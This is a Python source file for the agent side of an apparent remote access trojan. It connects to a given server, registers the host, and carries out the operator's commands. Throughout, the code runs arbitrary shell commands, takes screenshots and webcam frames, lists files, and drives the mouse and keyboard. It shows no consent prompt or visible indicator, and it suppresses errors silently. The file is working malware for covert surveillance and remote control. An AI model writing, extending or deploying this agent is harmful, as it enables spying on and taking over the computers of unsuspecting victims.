import asyncio
import logging
import json
import os
import sys
import time
import subprocess
from pathlib import Path

from rat.protocol import SecureTransport, Message, MsgType, handshake_client

logger = logging.getLogger("rat.agent")

class Agent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.transport = None
        self.connected = False
        self.agent_id = f"{os.getpid()}-{int(time.time())}"

    async def connect(self):
        try:
            logger.info(f"Connecting to {self.server_host}:{self.server_port}...")
            reader, writer = await asyncio.open_connection(self.server_host, self.server_port)
            self.transport = await handshake_client(reader, writer)
            self.connected = True
            
            await self.transport.send(Message(
                type=MsgType.REGISTER,
                meta={"id": self.agent_id, "platform": sys.platform}
            ))
            
            resp = await self.transport.recv()
            if resp and resp.type == MsgType.REGISTER_OK:
                logger.info("Registered successfully")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    async def run(self):
        if not await self.connect():
            return
        
        logger.info("Agent running")
        try:
            while self.connected:
                msg = await self.transport.recv()
                if not msg:
                    logger.warning("Connection lost")
                    break
                await self.handle_message(msg)
        except Exception as e:
            logger.error(f"Agent error: {e}")
        finally:
            if self.transport:
                await self.transport.close()

    async def handle_message(self, msg):
        if msg.type == MsgType.PING:
            await self.transport.send(Message(type=MsgType.PONG))
        
        elif msg.type == MsgType.SCREENSHOT:
            data = await self.capture_screen()
            await self.transport.send(Message(
                type=MsgType.SCREENSHOT_DATA,
                payload=data,
                meta={"size": len(data)}
            ))
        
        elif msg.type == MsgType.SHELL_EXEC:
            result = await self.exec_shell(msg.meta.get("cmd", ""))
            await self.transport.send(Message(
                type=MsgType.SHELL_RESULT,
                meta=result
            ))
        
        elif msg.type == MsgType.LIST_FILES:
            path = Path(msg.meta.get("path", "."))
            files = await self.list_files(path)
            await self.transport.send(Message(
                type=MsgType.FILES_LIST,
                meta={"files": files}
            ))
        
        elif msg.type == MsgType.WEBCAM:
            frame = await self.capture_webcam()
            await self.transport.send(Message(
                type=MsgType.WEBCAM_FRAME,
                payload=frame,
                meta={"size": len(frame)}
            ))
        
        elif msg.type == MsgType.INPUT_MOUSE:
            result = await self.mouse_action(msg.meta)
            await self.transport.send(Message(type=MsgType.INPUT_RESULT, meta=result))
        
        elif msg.type == MsgType.INPUT_KEYBOARD:
            result = await self.keyboard_action(msg.meta)
            await self.transport.send(Message(type=MsgType.INPUT_RESULT, meta=result))

    async def capture_screen(self):
        try:
            from mss import mss
            from PIL import Image
            import io
            with mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img = img.resize((img.width // 2, img.height // 2))
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=50)
                return buf.getvalue()
        except:
            return b""

    async def exec_shell(self, cmd):
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            return {
                "success": proc.returncode == 0,
                "stdout": stdout.decode(errors="replace")[:10000],
                "stderr": stderr.decode(errors="replace")[:2000],
                "code": proc.returncode
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def list_files(self, path):
        try:
            return [{"name": f.name, "size": f.stat().st_size if f.is_file() else 0, "dir": f.is_dir()}
                    for f in path.iterdir()][:100]
        except:
            return []

    async def capture_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                return buf.tobytes()
        except:
            pass
        return b""

    async def mouse_action(self, meta):
        try:
            import pyautogui
            action = meta.get("action")
            if action == "move":
                pyautogui.moveTo(meta["x"], meta["y"])
            elif action == "click":
                pyautogui.click(meta["x"], meta["y"])
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def keyboard_action(self, meta):
        try:
            import pyautogui
            if meta.get("action") == "type":
                pyautogui.typewrite(meta["text"])
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
